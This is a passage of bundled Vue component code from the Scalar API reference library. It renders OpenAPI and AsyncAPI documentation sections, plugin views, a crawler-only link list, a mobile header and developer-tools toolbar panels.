							clientOptions: __props.clientOptions,
							document: __props.document,
							entries: entry.children,
							eventBus: __props.eventBus,
							expandedItems: __props.expandedItems,
							insideTagContainer: true,
							level: __props.level + 1,
							options: __props.options,
							securitySchemes: __props.securitySchemes,
							selectedClient: __props.selectedClient,
							selectedExample: __props.selectedExample,
							selectedServer: __props.selectedServer
						}, null, 8, [
							"authStore",
							"clientOptions",
							"document",
							"entries",
							"eventBus",
							"expandedItems",
							"level",
							"options",
							"securitySchemes",
							"selectedClient",
							"selectedExample",
							"selectedServer"
						])) : createCommentVNode("", true)]),
						_: 2
					}, 1032, [
						"eventBus",
						"isCollapsed",
						"layout",
						"moreThanOneTag",
						"nested",
						"tag"
					])) : isTagGroup(entry) ? (openBlock(), createElementBlock("div", {
						key: 2,
						id: entry.id
					}, [createVNode(_component_TraversedEntry, {
						authStore: __props.authStore,
						clientOptions: __props.clientOptions,
						document: __props.document,
						entries: entry.children || [],
						eventBus: __props.eventBus,
						expandedItems: __props.expandedItems,
						insideTagContainer: __props.insideTagContainer,
						level: __props.level + 1,
						options: __props.options,
						securitySchemes: __props.securitySchemes,
						selectedClient: __props.selectedClient,
						selectedExample: __props.selectedExample,
						selectedServer: __props.selectedServer
					}, null, 8, [
						"authStore",
						"clientOptions",
						"document",
						"entries",
						"eventBus",
						"expandedItems",
						"insideTagContainer",
						"level",
						"options",
						"securitySchemes",
						"selectedClient",
						"selectedExample",
						"selectedServer"
					])], 8, _hoisted_1$22)) : isModelsTag(entry) && __props.document.components?.schemas ? (openBlock(), createBlock(ModelTag_default, {
						key: 3,
						id: entry.id,
						eventBus: __props.eventBus,
						isCollapsed: !__props.expandedItems[entry.id],
						layout: __props.options.layout,
						modelsSectionLabel: __props.options.modelsSectionLabel
					}, {
						default: withCtx(() => [createVNode(_component_TraversedEntry, {
							authStore: __props.authStore,
							clientOptions: __props.clientOptions,
							document: __props.document,
							entries: entry.children || [],
							eventBus: __props.eventBus,
							expandedItems: __props.expandedItems,
							level: __props.level + 1,
							options: __props.options,
							securitySchemes: __props.securitySchemes,
							selectedClient: __props.selectedClient,
							selectedExample: __props.selectedExample,
							selectedServer: __props.selectedServer
						}, null, 8, [
							"authStore",
							"clientOptions",
							"document",
							"entries",
							"eventBus",
							"expandedItems",
							"level",
							"options",
							"securitySchemes",
							"selectedClient",
							"selectedExample",
							"selectedServer"
						])]),
						_: 2
					}, 1032, [
						"id",
						"eventBus",
						"isCollapsed",
						"layout",
						"modelsSectionLabel"
					])) : isModel(entry) && modelSchemas.value[entry.name] ? (openBlock(), createBlock(Model_default, {
						key: 4,
						id: entry.id,
						document: __props.document,
						eventBus: __props.eventBus,
						isCollapsed: !__props.expandedItems[entry.id],
						name: entry.name,
						options: __props.options,
						schema: modelSchemas.value[entry.name]
					}, null, 8, [
						"id",
						"document",
						"eventBus",
						"isCollapsed",
						"name",
						"options",
						"schema"
					])) : createCommentVNode("", true)]),
					_: 2
				}, 1032, ["id", "expanded"]);
			}), 128);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/RenderPlugins/RenderPluginView.vue.script.js
var _hoisted_1$21 = ["id"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/RenderPlugins/RenderPluginView.vue.js
var RenderPluginView_default = /* @__PURE__ */ defineComponent({
	__name: "RenderPluginView",
	props: {
		item: {},
		options: {},
		eventBus: {}
	},
	setup(__props) {
		const el = useTemplateRef("el");
		/**
		* Participate in the existing scroll-spy. We only emit when the view opts into a sidebar
		* entry, because otherwise we would select a navigation item that does not exist and clear
		* the currently active section as the user scrolls past the plugin view.
		*/
		useIntersection(el, () => {
			if (__props.item.sidebar?.show) __props.eventBus?.emit("intersecting:nav-item", { id: __props.item.id });
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				id: __props.item.id,
				ref_key: "el",
				ref: el
			}, [createVNode(unref(ScalarErrorBoundary_default), null, {
				default: withCtx(() => [__props.item.renderer ? (openBlock(), createBlock(resolveDynamicComponent(__props.item.renderer), normalizeProps$1(mergeProps({ key: 0 }, {
					component: __props.item.component,
					options: __props.options,
					...__props.item.props
				})), null, 16)) : (openBlock(), createBlock(resolveDynamicComponent(__props.item.component), normalizeProps$1(mergeProps({ key: 1 }, {
					options: __props.options,
					...__props.item.props
				})), null, 16))]),
				_: 1
			})], 8, _hoisted_1$21);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/RenderPlugins/RenderPlugins.vue.script.js
var _hoisted_1$20 = {
	key: 0,
	class: "plugin-view"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/RenderPlugins/RenderPlugins.vue.js
var RenderPlugins_default = /* @__PURE__ */ defineComponent({
	__name: "RenderPlugins",
	props: {
		viewName: {},
		options: {},
		eventBus: {},
		documentSlug: {}
	},
	setup(__props) {
		const { getViewComponents } = usePluginManager();
		const components = computed(() => getViewComponents(__props.viewName, __props.documentSlug));
		return (_ctx, _cache) => {
			return components.value.length ? (openBlock(), createElementBlock("div", _hoisted_1$20, [(openBlock(true), createElementBlock(Fragment, null, renderList(components.value, (item) => {
				return openBlock(), createBlock(RenderPluginView_default, {
					key: item.id,
					eventBus: __props.eventBus,
					item,
					options: __props.options
				}, null, 8, [
					"eventBus",
					"item",
					"options"
				]);
			}), 128))])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/SectionFlare/SectionFlare.vue.js
var _sfc_main$1 = {};
var _hoisted_1$19 = { class: "section-flare" };
function _sfc_render$2(_ctx, _cache) {
	return openBlock(), createElementBlock("div", _hoisted_1$19, [..._cache[0] || (_cache[0] = [createStaticVNode("<div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div><div class=\"section-flare-item\" data-v-5cebff7a></div>", 8)])]);
}
var SectionFlare_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main$1, [["render", _sfc_render$2], ["__scopeId", "data-v-5cebff7a"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Content.vue.script.js
var _hoisted_1$18 = { class: "narrow-references-container" };
var _hoisted_2$11 = {
	key: 3,
	class: "h-dvh"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Content.vue.js
var Content_default = /* @__PURE__ */ defineComponent({
	__name: "Content",
	props: {
		infoSectionId: {},
		contextChain: { default: () => [] },
		documentSlug: {},
		options: {},
		document: {},
		clientDocument: {},
		authStore: {},
		xScalarDefaultClient: {},
		xScalarDefaultExample: {},
		items: {},
		expandedItems: {},
		eventBus: {},
		environment: {},
		headingSlugGenerator: { type: Function }
	},
	setup(__props) {
		/** Generate all client options so that it can be shared between the top client picker and the operations */
		const clientOptions = computed(() => i$3(mapHiddenClientsConfig(__props.options.hiddenClients)));
		/** Reserve the context-bar slot before scrolling reaches a nested tag. */
		const showContextBar = computed(() => hasRenderableTagHierarchy(__props.items, __props.options.layout));
		/** Show useful context during the Introduction before scrolling selects a tag. */
		const contextBarChain = computed(() => __props.contextChain.length >= 2 ? __props.contextChain : getInitialContextChain(__props.items, __props.options.layout));
		/**
		* Custom SDK installation instructions that actually have something to render.
		* Entries with only a `lang` are ignored so we can fall back to the client
		* selector instead of showing an empty card.
		*/
		const sdkInstallation = computed(() => getRenderableSdks(openApiDocument.value?.info?.["x-scalar-sdk-installation"]));
		/**
		* Narrow the (possibly AsyncAPI) documents to OpenAPI documents. api-reference
		* is OpenAPI-native, so AsyncAPI fields surface as undefined/empty.
		*/
		const openApiDocument = computed(() => isOpenApiDocument(__props.document) ? __props.document : void 0);
		const openApiClientDocument = computed(() => isOpenApiDocument(__props.clientDocument) ? __props.clientDocument : void 0);
		/** AsyncAPI narrow, used to render the (currently channel-only) AsyncAPI content tree. */
		const asyncApiDocument = computed(() => isAsyncApiDocument(__props.document) ? __props.document : void 0);
		/** AsyncAPI narrow of the client document, where server selection/variables are persisted. */
		const asyncApiClientDocument = computed(() => isAsyncApiDocument(__props.clientDocument) ? __props.clientDocument : void 0);
		const documentType = computed(() => getDocumentType(__props.document));
		const specificationVersion = computed(() => {
			if (isAsyncApiDocument(__props.document)) return __props.document["x-original-aas-version"] ?? __props.document.asyncapi;
			return openApiDocument.value?.["x-original-oas-version"];
		});
		/** Computed property to get all OpenAPI extension fields from the root document object */
		const documentExtensions = computed(() => getXKeysFromObject(__props.document));
		/** Computed property to get all OpenAPI extension fields from the document's info object */
		const infoExtensions = computed(() => getXKeysFromObject(__props.document?.info));
		/** Compute the servers for the document */
		const servers = computed(() => getServers(__props.options?.servers ?? openApiClientDocument.value?.servers, {
			baseServerUrl: __props.options?.baseServerURL,
			documentUrl: __props.clientDocument?.["x-scalar-original-source-url"]
		}));
		/** Compute the selected server for the document only (for now) */
		const selectedServer = computed(() => getSelectedServer(openApiClientDocument.value ?? null, null, null, servers.value));
		/**
		* Compute the AsyncAPI servers (all protocols, not just WebSocket) for the
		* document-level server selector.
		*/
		const asyncApiServers = computed(() => asyncApiClientDocument.value ? getAsyncApiServers(asyncApiClientDocument.value, { webSocketOnly: false }) : []);
		/** Compute the selected AsyncAPI server for the document */
		const asyncApiSelectedServer = computed(() => getSelectedAsyncApiServer(asyncApiClientDocument.value ?? null, asyncApiServers.value));
		/** Merge authentication config with the document security schemes */
		const securitySchemes = computed(() => {
			const sourceDocument = asyncApiClientDocument.value ?? openApiClientDocument.value;
			return mergeSecurity((sourceDocument?.components ? getResolvedRef(sourceDocument.components) : void 0)?.securitySchemes, __props.options.authentication?.securitySchemes, __props.authStore, sourceDocument?.["x-scalar-navigation"]?.name ?? "", __props.options.oauth2RedirectUri);
		});
		/**
		* Whether to show the document-level auth selector.
		*
		* For OpenAPI it stays tied to `hideTestRequestButton`, since the auth feeds the interactive
		* test client. AsyncAPI has no document-level test request, so its auth display is decoupled
		* from that flag and shown whenever a document is present.
		*/
		const showAuthSelector = computed(() => Boolean(__props.document) && (Boolean(asyncApiDocument.value) || !__props.options.hideTestRequestButton));
		/** Ensures firstLazyLoadComplete is set for documents with no Lazy sections (e.g. no operations/tags/models). */
		onMounted(() => {
			scheduleInitialLoadComplete();
		});
		provideDocumentOutline("document");
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [createVNode(unref(SectionFlare_default)), createBaseVNode("div", _hoisted_1$18, [
				renderSlot(_ctx.$slots, "start"),
				createVNode(unref(RenderPlugins_default), {
					documentSlug: __props.documentSlug,
					eventBus: __props.eventBus,
					options: __props.options,
					viewName: "content.start"
				}, null, 8, [
					"documentSlug",
					"eventBus",
					"options"
				]),
				createVNode(unref(InfoBlock_default), {
					id: __props.infoSectionId,
					documentDownloadType: __props.options.documentDownloadType,
					documentExtensions: documentExtensions.value,
					documentType: documentType.value,
					documentUrl: __props.document?.["x-scalar-original-source-url"],
					eventBus: __props.eventBus,
					externalDocs: openApiDocument.value?.externalDocs,
					headingSlugGenerator: __props.headingSlugGenerator,
					info: __props.document?.info,
					infoExtensions: infoExtensions.value,
					layout: __props.options.layout,
					specificationVersion: specificationVersion.value
				}, {
					selectors: withCtx(() => [
						createVNode(unref(ScalarErrorBoundary_default), null, {
							default: withCtx(() => [servers.value?.length ? (openBlock(), createBlock(unref(IntroductionCardItem_default), {
								key: 0,
								class: "scalar-reference-intro-server scalar-client introduction-card-item text-base leading-normal [--scalar-address-bar-height:0px]"
							}, {
								default: withCtx(() => [createVNode(unref(ServerSelector_default), {
									eventBus: __props.eventBus,
									selectedServer: selectedServer.value,
									servers: servers.value
								}, null, 8, [
									"eventBus",
									"selectedServer",
									"servers"
								])]),
								_: 1
							})) : createCommentVNode("", true)]),
							_: 1
						}),
						createVNode(unref(ScalarErrorBoundary_default), null, {
							default: withCtx(() => [asyncApiServers.value.length ? (openBlock(), createBlock(unref(IntroductionCardItem_default), {
								key: 0,
								class: "scalar-reference-intro-server scalar-client introduction-card-item text-base leading-normal [--scalar-address-bar-height:0px]"
							}, {
								default: withCtx(() => [createVNode(unref(AsyncApiServerSelector_default), {
									eventBus: __props.eventBus,
									selectedServer: asyncApiSelectedServer.value,
									servers: asyncApiServers.value
								}, null, 8, [
									"eventBus",
									"selectedServer",
									"servers"
								])]),
								_: 1
							})) : createCommentVNode("", true)]),
							_: 1
						}),
						createVNode(unref(ScalarErrorBoundary_default), null, {
							default: withCtx(() => [showAuthSelector.value ? (openBlock(), createBlock(unref(IntroductionCardItem_default), {
								key: 0,
								class: "scalar-reference-intro-auth scalar-client introduction-card-item leading-normal"
							}, {
								default: withCtx(() => [createVNode(unref(Auth_default), {
									authStore: __props.authStore,
									document: __props.clientDocument,
									environment: __props.environment,
									eventBus: __props.eventBus,
									options: __props.options,
									securitySchemes: securitySchemes.value,
									selectedServer: selectedServer.value
								}, null, 8, [
									"authStore",
									"document",
									"environment",
									"eventBus",
									"options",
									"securitySchemes",
									"selectedServer"
								])]),
								_: 1
							})) : createCommentVNode("", true)]),
							_: 1
						}),
						createVNode(unref(ScalarErrorBoundary_default), null, {
							default: withCtx(() => [sdkInstallation.value.length ? (openBlock(), createBlock(unref(IntroductionCardItem_default), {
								key: 0,
								class: "introduction-card-item scalar-reference-intro-clients"
							}, {
								default: withCtx(() => [createVNode(unref(SdkInstallationInstructions_default), {
									class: "introduction-card-item scalar-reference-intro-clients",
									eventBus: __props.eventBus,
									selectedClient: __props.xScalarDefaultClient,
									xScalarSdkInstallation: sdkInstallation.value
								}, null, 8, [
									"eventBus",
									"selectedClient",
									"xScalarSdkInstallation"
								])]),
								_: 1
							})) : clientOptions.value.length && !asyncApiDocument.value ? (openBlock(), createBlock(unref(IntroductionCardItem_default), {
								key: 1,
								class: "introduction-card-item scalar-reference-intro-clients"
							}, {
								default: withCtx(() => [createVNode(unref(ClientSelector_default), {
									class: "introduction-card-item scalar-reference-intro-clients",
									clientOptions: clientOptions.value,
									eventBus: __props.eventBus,
									selectedClient: __props.xScalarDefaultClient
								}, null, 8, [
									"clientOptions",
									"eventBus",
									"selectedClient"
								])]),
								_: 1
							})) : createCommentVNode("", true)]),
							_: 1
						})
					]),
					_: 1
				}, 8, [
					"id",
					"documentDownloadType",
					"documentExtensions",
					"documentType",
					"documentUrl",
					"eventBus",
					"externalDocs",
					"headingSlugGenerator",
					"info",
					"infoExtensions",
					"layout",
					"specificationVersion"
				]),
				showContextBar.value ? (openBlock(), createBlock(unref(ContextBar_default), {
					key: 0,
					chain: contextBarChain.value,
					onNavigate: _cache[0] || (_cache[0] = (id) => __props.eventBus.emit("scroll-to:nav-item", { id }))
				}, null, 8, ["chain"])) : createCommentVNode("", true),
				__props.items.length && openApiDocument.value ? (openBlock(), createBlock(TraversedEntry_default, {
					key: 1,
					authStore: __props.authStore,
					clientOptions: clientOptions.value,
					document: openApiDocument.value,
					entries: __props.items,
					eventBus: __props.eventBus,
					expandedItems: __props.expandedItems,
					options: __props.options,
					securitySchemes: securitySchemes.value,
					selectedClient: __props.xScalarDefaultClient,
					selectedExample: __props.xScalarDefaultExample,
					selectedServer: selectedServer.value
				}, null, 8, [
					"authStore",
					"clientOptions",
					"document",
					"entries",
					"eventBus",
					"expandedItems",
					"options",
					"securitySchemes",
					"selectedClient",
					"selectedExample",
					"selectedServer"
				])) : __props.items.length && asyncApiDocument.value ? (openBlock(), createBlock(unref(AsyncApiTraversedEntry_default), {
					key: 2,
					document: asyncApiDocument.value,
					entries: __props.items,
					eventBus: __props.eventBus,
					expandedItems: __props.expandedItems,
					options: __props.options
				}, null, 8, [
					"document",
					"entries",
					"eventBus",
					"expandedItems",
					"options"
				])) : createCommentVNode("", true),
				createVNode(unref(RenderPlugins_default), {
					documentSlug: __props.documentSlug,
					eventBus: __props.eventBus,
					options: __props.options,
					viewName: "content.end"
				}, null, 8, [
					"documentSlug",
					"eventBus",
					"options"
				]),
				renderSlot(_ctx.$slots, "end"),
				!unref(firstLazyLoadComplete) ? (openBlock(), createElementBlock("div", _hoisted_2$11)) : createCommentVNode("", true)
			])], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/CrawlerNav.vue.script.js
var _hoisted_1$17 = {
	key: 0,
	"aria-hidden": "true",
	"data-scalar-crawler-nav": "",
	hidden: ""
};
var _hoisted_2$10 = ["href"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/CrawlerNav.vue.js
var CrawlerNav_default = /* @__PURE__ */ defineComponent({
	__name: "CrawlerNav",
	props: {
		items: {},
		basePath: {},
		isMultiDocument: { type: Boolean },
		options: {}
	},
	setup(__props) {
		/**
		* A crawler-only list of links to every entry in the navigation tree.
		*
		* The interactive sidebar keeps the children of collapsed groups out of the DOM, so
		* server-rendered HTML only contains the sections that happen to be expanded (by default
		* just the first tag). Crawlers do not run the JavaScript that expands groups, which
		* would leave operations and models inside collapsed tags undiscoverable. This component
		* renders a flat, hidden list of plain anchors so every URL is present in the HTML payload.
		*
		* Plain `<li><a>` markup keeps the per-entry cost to roughly one line of HTML — far
		* cheaper than server-rendering the real sidebar components for every entry.
		*
		* The parent unmounts this component right after hydration (see ApiReference.vue), so it
		* never affects the interactive experience.
		*
		* Scope: this mirrors the sidebar, which shows one document at a time, so `items` is the
		* active document's tree. In multi-document mode the other documents' deep links are not
		* exposed here — a crawler still has to reach each document's own URL first. Widening this
		* to every document would need each document's own `basePath`, so it is left for later.
		*/
		const links = computed(() => {
			const result = [];
			const walk = (entries) => {
				for (const entry of filterItems("reference", entries, __props.options?.hideOperationDefaultExamples)) {
					const href = makeHrefFromId(entry.id, __props.basePath, __props.isMultiDocument);
					if (href) result.push({
						id: entry.id,
						href,
						title: entry.title
					});
					if ("children" in entry && entry.children) walk(entry.children);
				}
			};
			walk(__props.items);
			return result;
		});
		return (_ctx, _cache) => {
			return links.value.length > 0 ? (openBlock(), createElementBlock("nav", _hoisted_1$17, [createBaseVNode("ul", null, [(openBlock(true), createElementBlock(Fragment, null, renderList(links.value, (link) => {
				return openBlock(), createElementBlock("li", { key: link.id }, [createBaseVNode("a", { href: link.href }, toDisplayString(link.title), 9, _hoisted_2$10)]);
			}), 128))])])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/MobileHeader.vue.script.js
var _hoisted_1$16 = ["data-scalar-scroll-header"];
var _hoisted_2$9 = { class: "flex h-(--scalar-header-height) w-full items-center border-b bg-inherit px-2" };
var _hoisted_3$6 = {
	key: 1,
	class: "flex-1 text-sm font-medium whitespace-nowrap"
};
var _hoisted_4$1 = { class: "flex h-6 items-center gap-1 pl-1" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/MobileHeader.vue.js
var MobileHeader_default = /* @__PURE__ */ defineComponent({
	__name: "MobileHeader",
	props: {
		breadcrumb: {},
		isSidebarOpen: { type: Boolean },
		showSidebar: { type: Boolean }
	},
	emits: ["toggleSidebar"],
	setup(__props, { emit: __emit }) {
		const { translate } = useLocalization();
		const emit = __emit;
		const variants = cva({
			base: "lg:hidden items-center bg-b-1 sticky top-(--scalar-custom-header-height,0) z-10 [grid-area:header]",
			variants: { open: { true: "h-(--refs-sidebar-height) custom-scrollbar flex flex-col z-50" } }
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [renderSlot(_ctx.$slots, "sidebar", normalizeProps$1(guardReactiveProps({ sidebarClasses: "hidden lg:flex sticky top-(--refs-header-height) h-(--refs-sidebar-height) w-(--refs-sidebar-width) [grid-area:navigation]" }))), createBaseVNode("div", {
				class: normalizeClass(["t-doc__header", unref(variants)({ open: __props.isSidebarOpen })]),
				"data-scalar-scroll-header": !__props.isSidebarOpen || void 0
			}, [createBaseVNode("header", _hoisted_2$9, [
				__props.showSidebar ? (openBlock(), createBlock(unref(ScalarIconButton_default), {
					key: 0,
					icon: __props.isSidebarOpen ? unref(ScalarIconX_default) : unref(ScalarIconList_default),
					label: __props.isSidebarOpen ? unref(translate)("navigation.closeMenu") : unref(translate)("navigation.openMenu"),
					size: "md",
					onClick: _cache[0] || (_cache[0] = ($event) => emit("toggleSidebar"))
				}, null, 8, ["icon", "label"])) : createCommentVNode("", true),
				__props.showSidebar ? (openBlock(), createElementBlock("span", _hoisted_3$6, toDisplayString(__props.breadcrumb), 1)) : renderSlot(_ctx.$slots, "search", {}, void 0, void 0, 2),
				createBaseVNode("div", _hoisted_4$1, [renderSlot(_ctx.$slots, "actions")])
			]), __props.isSidebarOpen ? renderSlot(_ctx.$slots, "sidebar", normalizeProps$1(guardReactiveProps({ sidebarClasses: "overflow-y-auto custom-scrollbar min-h-0 flex-1 w-full border-none" })), void 0, void 0, 0) : createCommentVNode("", true)], 10, _hoisted_1$16)], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarPopover.vue.script.js
var _hoisted_1$15 = {
	class: "text-c-2 hover:text-c-1 hover:bg-b-2 flex items-center gap-1 rounded px-2 py-2.25 text-base leading-none",
	type: "button"
};
var _hoisted_2$8 = { class: "custom-scroll bg-b-1 flex flex-col gap-7 rounded-lg p-7 pb-6" };
var _hoisted_3$5 = { class: "text-c-2 flex items-center justify-center gap-1 p-2 text-sm" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarPopover.vue.js
var ApiReferenceToolbarPopover_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarPopover",
	setup(__props) {
		const { translate } = useLocalization();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarPopover_default), {
				class: "max-h-[inherit] max-w-[inherit] p-0 text-base",
				placement: "bottom-end",
				teleport: ""
			}, {
				default: withCtx(({ open }) => [renderSlot(_ctx.$slots, "button", { open }, () => [createBaseVNode("button", _hoisted_1$15, [renderSlot(_ctx.$slots, "label"), createVNode(unref(ScalarIconCaretDown_default), { class: normalizeClass(["size-3", { "rotate-180": open }]) }, null, 8, ["class"])])])]),
				popover: withCtx((props) => [createBaseVNode("div", _hoisted_2$8, [renderSlot(_ctx.$slots, "default", normalizeProps$1(guardReactiveProps(props)))]), createBaseVNode("div", _hoisted_3$5, [createVNode(unref(ScalarIconInfo_default), { class: "size-3.5 shrink-0" }), createBaseVNode("div", null, [renderSlot(_ctx.$slots, "info", {}, () => [createTextVNode(toDisplayString(unref(translate)("developerTools.localhostOnly")), 1)])])])]),
				backdrop: withCtx(() => [createVNode(unref(ScalarFloatingBackdrop_default), { class: "bg-b-2 rounded-lg" })]),
				_: 3
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarTitle.vue.script.js
var _hoisted_1$14 = {
	class: "text-c-2 hover:text-c-1 hover:bg-b-2 ml-auto flex items-center gap-1 rounded px-2 py-2.25 text-base leading-none",
	type: "button"
};
var _hoisted_2$7 = { class: "-m-2 flex flex-col gap-2 leading-relaxed" };
var _hoisted_3$4 = { class: "bg-b-2 inline-flex items-center gap-0.5 rounded border px-1 py-0.5 text-sm" };
var CONFIG_SETTING = "showDeveloperTools: \"never\"";
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarTitle.vue.js
var ApiReferenceToolbarTitle_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarTitle",
	setup(__props) {
		const { copyToClipboard } = useClipboard();
		const { translate } = useLocalization();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(ApiReferenceToolbarPopover_default, {
				class: "w-120",
				placement: "bottom-start"
			}, {
				button: withCtx(() => [createBaseVNode("button", _hoisted_1$14, [createVNode(unref(ScalarIconInfo_default)), createTextVNode(" " + toDisplayString(unref(translate)("developerTools.title")), 1)])]),
				info: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.localhostOnly")), 1)]),
				default: withCtx(() => [createBaseVNode("div", _hoisted_2$7, [createBaseVNode("div", null, toDisplayString(unref(translate)("developerTools.intro")), 1), createBaseVNode("div", null, [
					createTextVNode(toDisplayString(unref(translate)("developerTools.disableToolbarBefore")) + " ", 1),
					createBaseVNode("div", _hoisted_3$4, [createBaseVNode("code", { class: "font-code" }, toDisplayString(CONFIG_SETTING)), createVNode(unref(ScalarIconButton_default), {
						class: "-m-1 p-1.25",
						icon: unref(ScalarIconCopy_default),
						label: unref(translate)("actions.copyToClipboard"),
						size: "sm",
						onClick: _cache[0] || (_cache[0] = ($event) => unref(copyToClipboard)(CONFIG_SETTING))
					}, null, 8, ["icon", "label"])]),
					createTextVNode(" " + toDisplayString(unref(translate)("developerTools.disableToolbarAfter")), 1)
				])])]),
				_: 1
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarBlurb.vue.js
var _sfc_main = {};
var _hoisted_1$13 = { class: "text-c-3 [&_code]:font-code [&_a:hover]:text-c-1 text-center leading-normal [&_a]:underline" };
function _sfc_render$1(_ctx, _cache) {
	return openBlock(), createElementBlock("p", _hoisted_1$13, [renderSlot(_ctx.$slots, "default")]);
}
var ApiReferenceToolbarBlurb_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(_sfc_main, [["render", _sfc_render$1]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarRegisterButton.vue.js
var ApiReferenceToolbarRegisterButton_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarRegisterButton",
	props: /*@__PURE__*/ mergeModels({
		workspace: {},
		externalUrls: {},
		sdks: { default: () => [] }
	}, {
		"url": {},
		"urlModifiers": {}
	}),
	emits: ["update:url"],
	setup(__props) {
		const tempDocUrl = useModel(__props, "url");
		const { toast } = useToasts();
		const loader = useLoadingState();
		const { translate } = useLocalization();
		/** Open the registration link in a new tab */
		function openRegisterLink(docUrl) {
			const url = new URL(`${__props.externalUrls.dashboardUrl}/register`);
			url.searchParams.set("url", docUrl);
			__props.sdks.forEach((sdk) => url.searchParams.append("sdk", sdk));
			window.open(url.toString(), "_blank");
		}
		/** Generate and open the registration link */
		async function generateRegisterLink() {
			if (loader.isLoading || !__props.workspace) return;
			if (tempDocUrl.value) {
				openRegisterLink(tempDocUrl.value);
				return;
			}
			loader.start();
			const document = __props.workspace.exportActiveDocument("json");
			if (!document) {
				toast(translate("developerTools.unableToExportDocument"), "error");
				await loader.invalidate();
				return;
			}
			try {
				tempDocUrl.value = await uploadTempDocument(document, __props.externalUrls);
				await loader.validate();
				openRegisterLink(tempDocUrl.value);
				await nextTick();
				await loader.clear();
			} catch (error) {
				const message = error instanceof Error ? error.message : translate("developerTools.unknownError");
				toast(message, "error");
				await loader.invalidate();
			}
		}
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarButton_default), {
				class: "h-auto p-2.5",
				loader: unref(loader),
				onClick: generateRegisterLink
			}, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default", {}, () => [createTextVNode(toDisplayString(unref(translate)("developerTools.generate")), 1)])]),
				_: 3
			}, 8, ["loader"]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarShareRegister.vue.script.js
var _hoisted_1$12 = { class: "text-c-2 mb-2 grid grid-cols-2 gap-2.5 font-medium" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarShareRegister.vue.js
var ApiReferenceToolbarShareRegister_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarShareRegister",
	props: {
		workspace: {},
		externalUrls: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const FEATURES = [
			{
				icon: ScalarIconLockSimple_default,
				labelKey: "developerTools.passwordProtection"
			},
			{
				icon: ScalarIconGlobeSimple_default,
				labelKey: "developerTools.customDomains"
			},
			{
				icon: ScalarIconBookOpen_default,
				labelKey: "developerTools.freeFormContent"
			},
			{
				icon: ScalarIconCloud_default,
				labelKey: "developerTools.cdnInfrastructure"
			},
			{
				icon: ScalarIconGitBranch_default,
				labelKey: "developerTools.pullFromGitHub"
			},
			{
				icon: ScalarIconFileMd_default,
				labelKey: "developerTools.markdownMdx"
			},
			{
				icon: ScalarIconWarningOctagon_default,
				labelKey: "developerTools.spectralLinting"
			},
			{
				icon: ScalarIconBracketsCurly_default,
				labelKey: "developerTools.jsonSchemaHosting"
			},
			{
				icon: ScalarIconSparkle_default,
				labelKey: "developerTools.askAi"
			},
			{
				icon: ScalarIconPlugsConnected_default,
				labelKey: "developerTools.mcpServers"
			}
		];
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [
				createBaseVNode("ul", _hoisted_1$12, [(openBlock(), createElementBlock(Fragment, null, renderList(FEATURES, (feature) => {
					return createBaseVNode("li", {
						key: feature.labelKey,
						class: "flex items-center gap-2"
					}, [(openBlock(), createBlock(resolveDynamicComponent(feature.icon), {
						class: "text-c-3 size-3.5",
						weight: "bold"
					})), createTextVNode(" " + toDisplayString(unref(translate)(feature.labelKey)), 1)]);
				}), 64))]),
				createVNode(ApiReferenceToolbarRegisterButton_default, {
					externalUrls: __props.externalUrls,
					workspace: __props.workspace
				}, {
					default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.deployOnScalar")), 1)]),
					_: 1
				}, 8, ["externalUrls", "workspace"]),
				createVNode(ApiReferenceToolbarBlurb_default, null, {
					default: withCtx(() => [
						createTextVNode(toDisplayString(unref(translate)("developerTools.deployFree")) + " ", 1),
